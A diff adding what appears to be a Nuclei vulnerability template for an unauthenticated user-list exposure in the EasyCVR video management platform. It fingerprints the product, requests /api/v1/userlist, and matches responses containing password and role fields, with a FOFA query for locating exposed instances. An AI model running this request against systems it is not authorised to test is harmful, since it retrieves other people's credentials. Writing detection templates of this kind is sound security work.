@@ -1,0 +1,47 @@
+id: easycvr-info-leak
+
+info:
+  name: EasyCVR video management - Users Information Exposure
+  author: pussycat0x
+  severity: high
+  description: |
+    EasyCVR video management platform has leaked user information
+  reference:
+    - https://github.com/wy876/POC/blob/main/EasyCVR%20%E8%A7%86%E9%A2%91%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: "title=\"EasyCVR\""
+  tags: unauth,easycvr,misconfig
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: dsl
+        internal: true
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "<title>EasyCVR")'
+        condition: and
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/userlist?pageindex=0&pagesize=10"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "count"
+          - "Password"
+          - "RoleId"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a0047304502205f12278e1632b5929492e691e0b093574e8c0dcabb4c40d2dd5940e3109d85ca022100ed2ef18d7494968121cfaa6ff152906d4211c680adb6fbb09ea8225b5a19ff23:922c64590222798bb761d5b6d8e72950
